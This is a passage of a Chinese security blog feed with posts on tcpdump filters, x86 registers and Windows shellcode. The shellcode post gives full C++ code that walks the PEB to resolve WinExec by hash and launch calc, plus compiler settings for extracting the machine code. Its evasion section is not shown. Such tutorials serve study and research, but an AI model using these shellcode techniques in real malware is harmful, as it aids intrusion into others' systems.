&#125;&#125;</code></pre></div><p>这样会成功，原理跟随反射实例第一个实例来理解。<br>现在可以打开计算器，明白什么是序列与反序列化了。</p><p>关于cc1的链，之后再写，可以看bilibili 白日梦组长分析思路<br>我个人觉得他的思路是真的超级棒。</p>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump抓包</title>
    <link href="/article/201a570f.html"/>
    <url>/article/201a570f.html</url>
    
    <content type="html"><![CDATA[<h1 id="抓包原理"><a href="#抓包原理" class="headerlink" title="抓包原理"></a>抓包原理</h1><p>当网卡接收到一个网络报文后，会去遍历系统中所有已经注册了的网络协议，来尝试报文处理。</p><p>抓包模块会将自己伪装成一个网络协议，系统在遍历的时候就会发给抓包模块一份，抓包趁机将报文复制一份</p><h2 id="tcpdump用法"><a href="#tcpdump用法" class="headerlink" title="tcpdump用法"></a>tcpdump用法</h2><p>注意，需要root权限</p><p>使用<code> -w  a .pcap</code> 保存到数据包</p><ol><li>tcpdump</li></ol><blockquote><p>抓取所有经过第一网络接口的数据包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142257905.png" alt="image-20220402142257905"></p><ol start="2"><li>tcpdump -i lo0</li></ol><blockquote><p>抓取某个网卡的数据 lo0是我本地网卡，用ifconfig可以查看</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142304854.png" alt="image-20220402142304854"></p><ol start="3"><li>tcpdump -i en0 host 110.242.68.3</li></ol><blockquote><p>抓取经过en0 其目标地址或者源地址是110.242.68.3的数据包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142319281.png" alt="image-20220402142319281"></p><ol start="4"><li>tcpdump -i bridge100 host 192.168.150.1 and 192.168.150.14</li></ol><blockquote><p>抓取经过bridge100的主机192.168.150.1 与主机192.168.150.14间的流量包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142326636.png" alt="image-20220402142326636"></p><ol start="5"><li>tcpdump -i bridge100 -n  host 192.168.150.1 and ! 192.168.150.14</li></ol><blockquote><p>抓取经过bridge100的主机192.168.150.1 与除了主机192.168.150.14的所有流量包</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142332919.png" alt="image-20220402142332919"></p><ol start="6"><li>tcpdump src host 192.168.150.14</li></ol><blockquote><p>抓取主机192.168.150.14 发送的所有数据</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142338294.png" alt="image-20220402142338294"></p><ol start="7"><li>tcpdump dst host 192.168.150.14</li></ol><blockquote><p>抓取所有流向192.168.150.14的数据</p></blockquote><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142345128.png" alt="image-20220402142345128"></p><ol start="8"><li>tcpdump host 192.168.150.14 and tcp port 80</li></ol><blockquote><p>抓取主机192.168.150.14所有在TCP 80端口的数据包：</p></blockquote><ol start="9"><li>tcpdump host 192.168.150.14 and dst port 80</li></ol><blockquote><p>抓取主机192.168.150.14所有在http 80端口的数据包：</p></blockquote><ol start="10"><li>tcpdump port 80</li></ol><blockquote><p>抓取80端口获取或者发送的数据，可以用dst和src来来区分</p></blockquote><ol start="11"><li>tcpdump net 192.168</li></ol><blockquote><p>抓取网络192.168的数据，可以用dst和src来来区分</p></blockquote><ol start="12"><li>tcpdump 协议名</li></ol><blockquote><p>过滤协议</p></blockquote><ol start="13"><li>tcpdump ‘((tcp) and (port 80) and ((dst host 192.168.150.1) or (dst host 192.168.150.14)))’</li></ol><blockquote><p>目标是主机（192.168.150.1 或者192.168.150.14） 的 80端口的tcp的数据，注意理解其用法</p></blockquote><ol start="14"><li>tcpdump ‘tcp[tcpflags] &#x3D; tcp-syn’</li></ol><blockquote><p>只抓syn包，如果要抓syn和ACK包 去掉等号及其后面</p></blockquote><ol start="15"><li>tcpdump ‘((port 25) and (tap[(tcp[12]&gt;&gt;2):4] &#x3D; 0x4d41494c))’</li></ol><blockquote><p>抓取数据区开头为MAIL的包，MAIL的十六进制为 0x4d41494c</p></blockquote><ol start="16"><li>tcpdump ‘tcp[(tcp[12] &gt;&gt; 2):4 &#x3D; 0x47455420]’</li></ol><blockquote><p>抓取get包，get的十六进制0x47455420，post同理</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>一些杂七杂八的技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Windows ShellCode提取加载与免杀</title>
    <link href="/article/570c6a7.html"/>
    <url>/article/570c6a7.html</url>
    
    <content type="html"><![CDATA[<p>这篇文章仅讲windows下的，linux下比较简单，之后可能会写</p><p>shellcode是一段用于利用软件漏洞而执行的代码</p><h1 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h1><p>首先说明，shellcode编写可以用c也可以直接用汇编来写，但难度不在一个层级，我们选择c》</p><p>vs我用的是vs2013，本来用的2008，但是找不到汇编窗口</p><p>下面是windows shellcode编写的步骤</p><blockquote><p>获取kernel32.dll 基地址； </p><p>定位 GetProcAddress函数的地址； </p><p>使用GetProcAddress确定 LoadLibrary函数的地址； </p><p>然后使用 LoadLibrary加载DLL文件（例如user32.dll）； </p><p>使用 GetProcAddress查找某个函数的地址（例如MessageBox）； </p><p>指定函数参数； </p><p>调用函数。</p></blockquote><p>首先要注意shellcode的<code>地址无关</code>原则</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">char</span>* arr = <span class="hljs-string">&quot;test&quot;</span>;</code></pre></div><p>我们看到这么写的话 test存放在一个固定地址，而不同windows下的内存地址是不同的，所以我们不能将地址写死</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141753290.png" alt="image-20220402141753290"></p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-type">char</span> cmd[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;</code></pre></div><p>但上面这种写法就不会有固定地址，但这样写需要用<code>\x00</code>来截断</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141804620.png" alt="image-20220402141804620"></p><p>现在地址无关解决，下一步是函数调用，我们需要kernel32.dll 基地址，但是由于ASLR导致dll可以加载到不同的内存位置，需要动态定位</p><p>PEB结构位于固定内存位置，所以我们可以通过PEB来获取。</p><blockquote><p>读取PEB结构 </p><p>跳转到0xC偏移处读取Ldr指针 </p><p>跳转到0x14偏移处读取 InMemoryOrderModuleList字段</p></blockquote><p>如果你不太懂上面三步，尽量多思考一下下面的内容</p><blockquote><p>进程：是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，可以简单的理解为，计算机中每运行的一个软件都是一个进程。</p><p>PEB：是一个位于所有进程内存中固定位置的结构体。此结构体包含关于进程的有用信息，如可执行文件加载到内存的位置，模块列表（DLL），指示进程是否被调试的标志，还有许多其他的信息。</p></blockquote><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB</span> &#123;  BYTE                          Reserved1[<span class="hljs-number">2</span>];  BYTE                          BeingDebugged;  BYTE                          Reserved2[<span class="hljs-number">1</span>];  PVOID                         Reserved3[<span class="hljs-number">2</span>];  PPEB_LDR_DATA                 Ldr;  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  BYTE                          Reserved4[<span class="hljs-number">104</span>];  PVOID                         Reserved5[<span class="hljs-number">52</span>];  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  BYTE                          Reserved6[<span class="hljs-number">128</span>];  PVOID                         Reserved7[<span class="hljs-number">1</span>];  ULONG                         SessionId;&#125; PEB, *PPEB;</code></pre></div><p>上面是微软关于PEB结构体的官方文档，</p><blockquote><p>上面内容的一些概念</p><p>BYTE表示1个字节</p><p>PVOID表示1个指针（或1个内存地址，ps：一定要弄明白指针这东西，很重要）在0x86中一个地址占四个字节</p><p>PPEB_LDR_DATA是1个指针，指向自定义结构体PEB_LDR_DATAPEB_LDR_DATA</p><p>BeingDebugged标志是1个字节</p><p>Reserved1[2]是两个BYTE的数组，占两个字节</p><p>Reserved3[2]是两个PVOID指针的数组，占八个字节</p></blockquote><p>我们重点关注下PEB_LDR_DATA（跳转到0xC偏移处读取Ldr指针 ）</p><p>跳转偏移计算：2 + 1 + 1 + 8 &#x3D; 12 &#x3D; 0xC</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_PEB_LDR_DATA</span> &#123;  BYTE       Reserved1[<span class="hljs-number">8</span>];  PVOID      Reserved2[<span class="hljs-number">3</span>];  LIST_ENTRY InMemoryOrderModuleList;&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</code></pre></div><p>关注LIST_ENTRY InMemoryOrderModuleList（跳转到0x14偏移处读取 InMemoryOrderModuleList字段）</p><p>跳转偏移计算：8 + 12 &#x3D; 20 &#x3D; 0x14</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span> &#123;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span>  *Flink;  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_LIST_ENTRY</span>  *Blink;&#125; LIST_ENTRY, *PLIST_ENTRY;</code></pre></div><p>LIST_ENTRY结构是一个简单的双向链表，包含指向下一个元素（Flink）的指针和指向上一个元素的指针（Blink）</p><p>InMemoryOrderModuleList字段是一个指针，指向LDR_DATA_TABLE_ENTRY 结构体上的LIST_ENTRY字段。但是它不是指向</p><p>LDR_DATA_TABLE_ENTRY 起始位置的指针，而是指向这个结构的InMemoryOrderLinks字段。</p><p>上面操作完到了内存首个<code>模块</code>的InMemoryOrderLinks元素，这个<code>模块</code>是一个可执行文件（.exe），我们需要去遍历加载到内存的dll文件。</p><p>具体通过InMemoryOrderModuleList.Flink来访问第二个已加载的模块，通过循环操作就可以遍历所有已加载的模块</p><blockquote><p>calc.exe </p><p>ntdll.dll </p><p>kernel32.dll </p></blockquote><p>当我们通过遍历得到kernel32.dll后就可以完成下面操作了</p><blockquote><p>获取kernel32.dll 基地址； </p><p>定位 GetProcAddress函数的地址； </p><p>使用GetProcAddress确定 LoadLibrary函数的地址； </p><p>然后使用 LoadLibrary加载DLL文件（例如user32.dll）； </p><p>使用 GetProcAddress查找某个函数的地址（例如MessageBox）； </p><p>指定函数参数； </p><p>调用函数。</p></blockquote><p>这边有个代码模版，如果你实在不会写可以参考这个模版来理解上述操作</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;winnt.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;winternl.h&gt;</span></span><span class="hljs-function">DWORD <span class="hljs-title">getHash</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span> </span>&#123;DWORD h = <span class="hljs-number">0</span>;<span class="hljs-keyword">while</span> (*str) &#123;h = (h &gt;&gt; <span class="hljs-number">13</span>) | (h &lt;&lt; (<span class="hljs-number">32</span> - <span class="hljs-number">13</span>));h += *str &gt;= <span class="hljs-string">&#x27;a&#x27;</span> ? *str - <span class="hljs-number">32</span> : *str;str++;&#125;<span class="hljs-keyword">return</span> h;&#125;<span class="hljs-function">DWORD <span class="hljs-title">getunicodeHash</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span>* str)</span> </span>&#123;DWORD h = <span class="hljs-number">0</span>;PWORD ptr = (PWORD)str;<span class="hljs-keyword">while</span> (*ptr) &#123;h = (h &gt;&gt; <span class="hljs-number">13</span>) | (h &lt;&lt; (<span class="hljs-number">32</span> - <span class="hljs-number">13</span>));h += (BYTE)(*ptr) &gt;= <span class="hljs-string">&#x27;a&#x27;</span> ? (BYTE)(*ptr) - <span class="hljs-number">32</span> : (BYTE)(*ptr);ptr++;&#125;<span class="hljs-keyword">return</span> h;&#125;<span class="hljs-function">PVOID <span class="hljs-title">getWinExec</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-type">char</span> dllname[] = &#123; <span class="hljs-string">&#x27;K&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;L&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span> &#125;;<span class="hljs-type">char</span> api[] = &#123; <span class="hljs-string">&#x27;W&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span> &#125;;_PEB* peb = <span class="hljs-built_in">NtCurrentTeb</span>()-&gt;ProcessEnvironmentBlock;LIST_ENTRY* first = peb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;LIST_ENTRY* ptr = first;<span class="hljs-keyword">do</span> &#123;LDR_DATA_TABLE_ENTRY* dte = (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - <span class="hljs-number">0x8</span>);BYTE* baseAddress = (BYTE*)dte-&gt;DllBase;ptr = ptr-&gt;Flink;<span class="hljs-keyword">if</span> (!baseAddress)<span class="hljs-keyword">continue</span>;PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(baseAddress + dosHeader-&gt;e_lfanew);DWORD iedRVA = ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<span class="hljs-keyword">if</span> (!iedRVA)<span class="hljs-keyword">continue</span>;PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + iedRVA);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getunicodeHash</span>(((<span class="hljs-keyword">decltype</span>(dte-&gt;FullDllName)*)(DWORD*)&amp;(dte-&gt;Reserved4))-&gt;Buffer) == <span class="hljs-built_in">getHash</span>(dllname)) &#123;DWORD* nameRVAs = (DWORD*)(baseAddress + ied-&gt;AddressOfNames);<span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; ied-&gt;NumberOfNames; i++) &#123;<span class="hljs-type">char</span>* funcName = (<span class="hljs-type">char</span>*)(baseAddress + nameRVAs[i]);<span class="hljs-keyword">if</span> (<span class="hljs-built_in">getHash</span>(funcName) == <span class="hljs-built_in">getHash</span>(api)) &#123;WORD ordinal = ((WORD*)(baseAddress + ied-&gt;AddressOfNameOrdinals))[i];DWORD functionRVA = ((DWORD*)(baseAddress + ied-&gt;AddressOfFunctions))[ordinal];<span class="hljs-keyword">return</span> baseAddress + functionRVA;&#125;&#125;&#125;&#125; <span class="hljs-keyword">while</span> (ptr != first);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-type">char</span> exec[] = &#123; <span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>&#125;;<span class="hljs-keyword">decltype</span>(WinExec)* myWinExec = (<span class="hljs-keyword">decltype</span>(WinExec)*)<span class="hljs-built_in">getWinExec</span>();<span class="hljs-built_in">myWinExec</span>(exec, <span class="hljs-number">0</span>);&#125;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">func</span>();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>上面代码执行完之后会弹出windows计算器</p><blockquote><p>这里不讲windows可利用shellcode的编写，cs，msf都已经提供了很好用的shellcode</p></blockquote><h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>shellcode的提取</p><blockquote><p>使用c++开发代码</p><p>更改VisualStudio编译配置</p><p>生成exe</p><p>在IDA下打开生成的exe，获得机器码</p></blockquote><p>开发代码我们已经完成了，接下来是编译</p><p>配置编译选项，下面很多是默认的</p><blockquote><p>release在调试工具栏</p></blockquote><p>使大小最小化</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 最大优化（优选大小）</p></blockquote><p>内联函数扩展</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 函数扩展(只适用于_inline(Ob1))</p></blockquote><p>启用内部函数</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 优化 - 启用函数选择（是）</p></blockquote><p>禁用安全检查(&#x2F;Gs-)</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 代码生成 - 安全检查（禁用）</p></blockquote><p>启用函数级链接</p><blockquote><p>项目 - (你项目名称的)属性  - c&#x2F;c++ - 代码生成 - 启用函数级链接(是)</p></blockquote><p>增量链接</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 -  常规 -启用增量链接 （否）</p></blockquote><p>生成映射文件</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 调试 - 生成映射文件 （是）</p><p>映射文件名随便写</p></blockquote><p>启用COMDAT折叠</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 优化 - 启用COMDAT折叠（是）</p></blockquote><p>函数顺序</p><blockquote><p>项目 - (你项目名称的)属性 - 链接器 - 优化 - 函数顺序 （function_order.txt）</p></blockquote><p>关闭SDL检查 </p><blockquote><p>项目 - (你项目名称的)属性 - c&#x2F;c++ - SDL检查改为否</p></blockquote><p>生成exe文件，用ida打开</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>intel x86寄存器及其汇编指令</title>
    <link href="/article/ec08c5f4.html"/>
    <url>/article/ec08c5f4.html</url>
    
    <content type="html"><![CDATA[<p>intel x86架构，复杂指令集，intel公司最成功的cpu架构。</p><p>x86代表32位架构</p><blockquote><p>我们平时装计算机所说的64位，32位代表寻址能力不同，一些地方说是支持的内存，其本质还是寻址能力</p><p>32位最大寻址内存范围是2的32次方，即4GB</p><div class="code-wrapper"><pre><code class="hljs 1k">1B=1024K=2^10K1GB=1024B=2^10B∴4GB=2^2*2^10*2^10*2^10=2^(2+10+10+10)=2^32```</code></pre></div><p>64位的最大寻址能力是2的64次方，即16384GB</p><p>但是，实际上限于种种原因，目前Windows 7 64位版仅能使用最大为192GB内存。</p><p>intel 系列向下兼容</p></blockquote><p>具体发展历史和一些细节：<a href="https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin">https://baike.baidu.com/item/Intel%20x86/1012845?fr=aladdin</a></p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>八个通用寄存器：EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI</p><p>一个标志寄存器：EFLAGS</p><p>五个控制寄存器：分别为CR0-CR4</p><p>八个调试寄存器：分别为DR0-DR7</p><p>四个系统地址寄存器：GDTR、IDTR、LDTR和TR</p><p>其他寄存器：EIP、TSC等</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>八个通用寄存器大多时候可以通用，但是某些寄存器有隐含用法。</p><h4 id="EAX"><a href="#EAX" class="headerlink" title="EAX"></a>EAX</h4><p>累加器，很多加法乘法指令的缺省寄存器。</p><h4 id="EBX"><a href="#EBX" class="headerlink" title="EBX"></a>EBX</h4><p>基地址(base)寄存器, 在内存寻址时存放基地址。</p><h4 id="ECX"><a href="#ECX" class="headerlink" title="ECX"></a>ECX</h4><p>是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。 </p><h4 id="EDX"><a href="#EDX" class="headerlink" title="EDX"></a>EDX</h4><p>总是被用来放整数除法产生的余数。</p><h4 id="ESI-x2F-EDI"><a href="#ESI-x2F-EDI" class="headerlink" title="ESI&#x2F;EDI"></a>ESI&#x2F;EDI</h4><p>分别叫做”源&#x2F;目标索引寄存器(source&#x2F;destination index)，因为在很多字符串操作指令中, DS:ESI指向源串,而ES:EDI指向目的串. </p><blockquote><p>源串和目的串（也有的叫目标串）：</p><p>如在strcpy(*d, *s);</p><p>这里s指向的字符串就是源字符串，d指向的为<em>目的</em>字符串</p></blockquote><h4 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h4><p>是基址指针(BASE POINTER)，它最经常被用作高级语言函数调用的”框架指针”(frame pointer)</p><h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p>专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</p><blockquote><p>一般esp到ebp这段空间就是当前栈</p></blockquote><h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141032834.png" alt="image-20220402141032834"></p><p>包含一组状态标志，系统标志以及一个控制标志</p><h4 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h4><p>若算术操作产生的结果在最高有效位(most-significant bit)发生进位或借位则将其置1，反之清零。</p><h4 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h4><p>如果结果的最低有效字节(least-significant byte)包含偶数个1位则该位置1，否则清零。</p><h4 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h4><p>如果算术操作在结果的第3位发生进位或借位则将该标志置1，否则清零。</p><h4 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h4><p>若结果为0则将其置1，反之清零。 </p><h4 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h4><p>该标志被设置为有符号整型的最高有效位。(0指示结果为正，反之则为负) </p><h4 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h4><p>如果整型结果是较大的正数或较小的负数，并且无法匹配目的操作数时将该位置1，反之清零。这个标志为带符号整型运算指示溢出状态。</p><h4 id="DF"><a href="#DF" class="headerlink" title="DF"></a>DF</h4><p>控制串指令(MOVS, CMPS, SCAS, LODS以及STOS)。设置DF标志使得串指令自动递减（从高地址向低地址方向处理字符串），清除该标志则使得串指令自动递增。STD以及CLD指令分别用于设置以及清除DF标志。</p><h4 id="TF"><a href="#TF" class="headerlink" title="TF"></a>TF</h4><p>将该位设置为1以允许单步调试模式，清零则禁用该模式。</p><h4 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h4><p>该标志用于控制处理器对可屏蔽中断请求的响应。置1以响应可屏蔽中断，反之则禁止可屏蔽中断。 </p><h4 id="IOPL"><a href="#IOPL" class="headerlink" title="IOPL"></a>IOPL</h4><p>指示当前运行任务的I&#x2F;O特权级，正在运行任务的当前特权级(CPL)必须小于或等于I&#x2F;O特权级才能允许访问I&#x2F;O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。</p><h4 id="NT"><a href="#NT" class="headerlink" title="NT"></a>NT</h4><p>这个标志控制中断链和被调用任务。若当前任务与前一个执行任务相关则置1，反之则清零。 </p><h4 id="RF"><a href="#RF" class="headerlink" title="RF"></a>RF</h4><p>控制处理器对调试异常的响应。</p><h4 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h4><p>置1以允许虚拟8086模式，清除则返回保护模式。</p><h4 id="AC"><a href="#AC" class="headerlink" title="AC"></a>AC</h4><p>标志以及在CR0寄存器中的AM位置1时将允许内存引用的对齐检查，以上两个标志中至少有一个被清零则禁用对齐检查。</p><h4 id="VIF"><a href="#VIF" class="headerlink" title="VIF"></a>VIF</h4><p>该标志是IF标志的虚拟镜像，与VIP标志结合起来使用。使用这个标志以及VIP标志，并设置CR4控制寄存器中的VME标志就可以允许虚拟模式扩展</p><h4 id="VIP"><a href="#VIP" class="headerlink" title="VIP"></a>VIP</h4><p>该位置1以指示一个中断正在被挂起，当没有中断挂起时该位清零，与VIF标志结合使用。 </p><h4 id="ID"><a href="#ID" class="headerlink" title="ID"></a>ID</h4><p> 程序能够设置或清除这个标志指示了处理器对CPUID指令的支持。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><h4 id="CR0"><a href="#CR0" class="headerlink" title="CR0"></a>CR0</h4><p>PE：CR0的位0是启用保护标志。当设置该位时即开启了保护模式；当复位时即进入实地址模式。这个标志仅开启段级保护，而并没有启用 分页机制。若要启用 分页机制，那么PE和PG标志都要置位。</p><blockquote><p>分页机制：<a href="https://baike.baidu.com/item/%E5%88%86%E9%A1%B5">https://baike.baidu.com/item/分页</a></p></blockquote><p>PG：CR0的位31是分页标志。当设置该位时即开启了分页机制；当复位时则禁止分页机制，此时所有线性地址等同于 物理地址。在开启这个标志之前必须已经或者同时开启PE标志。即若要启用分页机制，那么PE和PG标志都要置位。</p><p>WP：对于Intel 80486或以上的CPU，CR0的位16是 写保护（Write Proctect）标志。当设置该标志时，处理器会禁止 超级用户程序（例如 特权级0的程序）向用户级只读页面执行写操作；当该位复位时则反之。该标志有利于UNIX类操作系统在创建进程时实现写时复制（Copy on Write）技术。<br>NE：对于Intel 80486或以上的CPU，CR0的位5是 协处理器错误（Numeric Error）标志。当设置该标志时，就启用了x87 协处理器错误的内部报告机制；若复位该标志，那么就使用PC形式的x87协处理器 错误报告机制。当NE为复位状态并且CPU的IGNNE输入引脚有信号时，那么数学协处理器x87错误将被忽略。当NE为复位状态并且CPU的IGNNE输入引脚无信号时，那么非屏蔽的数学协处理器x87错误将导致处理器通过FERR引脚在外部产生一个中断，并且在执行下一个等待形式浮点指令或WAIT&#x2F;FWAIT指令之前立刻停止指令执行。CPU的FERR引脚用于仿真外部 协处理器80387的ERROR引脚，因此通常连接到中断控制器输入请求引脚上。NE标志、IGNNE引脚和FERR引脚用于利用外部逻辑来实现PC形式的外部 错误报告机制。</p><blockquote><p>启用保护模式PE（Protected Enable）位（位0）和开启 分页PG（Paging）位（位31）分别用于控制分段和分页机制。PE用于控制分段机制。如果PE&#x3D;1，处理器就工作在开启分段机制环境下，即运行在保护模式下。如果PE&#x3D;0，则处理器关闭了分段机制，并如同8086工作于实地址模式下。PG用于控制 分页机制。如果PG&#x3D;1，则开启了 分页机制。如果PG&#x3D;0， 分页机制被禁止，此时 线性地址被直接作为 物理地址使用。</p><p>如果PE&#x3D;0、PG&#x3D;0，处理器工作在实地址模式下；如果PG&#x3D;0、PE&#x3D;1，处理器工作在没有开启 分页机制的保护模式下；如果PG&#x3D;1、PE&#x3D;0，此时由于不在保护模式下不能启用分页机制，因此处理器会产生一个一般保护异常，即这种标志组合无效；如果PG&#x3D;1、PE&#x3D;1，则处理器工作在开启了分页机制的保护模式下。</p><p>当改变PE和PG位时，必须小心。只有当执行程序至少有部分代码和数据在线性地址空间和物理地址空间中具有相同地址时，我们才能改变PG位的设置。此时这部分具有相同地址的代码在 分页和未分页世界之间起着桥梁的作用。无论是否开启分页机制，这部分代码都具有相同的地址。另外，在开启分页（PG&#x3D;1）之前必须先刷新页高速缓冲TLB。<br>在修改该了PE位之后程序必须立刻使用一条跳转指令，以刷新处理器执行管道中已经获取的不同模式下的任何指令。在设置PE位之前，程序必须初始化几个系统段和控制寄存器。在系统刚上电时，处理器被复位成PE&#x3D;0和PG&#x3D;0（即实模式状态），以允许引导代码在启用分段和分页机制之前能够初始化这些寄存器和数据结构。</p></blockquote><h4 id="CR2和CR3"><a href="#CR2和CR3" class="headerlink" title="CR2和CR3"></a>CR2和CR3</h4><p>CR2和CR3用于分页机制。CR3含有存放页目录表页面的物理地址，因此CR3也被称为PDBR。因为页目录表页面是页对齐的，所以该寄存器只有高20位是有效的。而低12位保留供更高级处理器使用，因此在往CR3中加载一个新值时低12位必须设置为0。</p><h3 id="调试寄存器"><a href="#调试寄存器" class="headerlink" title="调试寄存器"></a>调试寄存器</h3><h4 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h4><p>全局描述符表寄存器，用于存放全局描述符表GDT的32位的线性基地址和16位的表限长值。基地址指定GDT表中字节0在线性地址空间中的地址，表长度指明GDT表的字节长度值。指令LGDT和SGDT分别用于加载和保存GDTR寄存器的内容。在机器刚加电或处理器复位后，基地址被默认地设置为0，而长度值被设置成0xFFFF。在保护模式初始化过程中必须给GDTR加载一个新值。</p><h4 id="IDTR"><a href="#IDTR" class="headerlink" 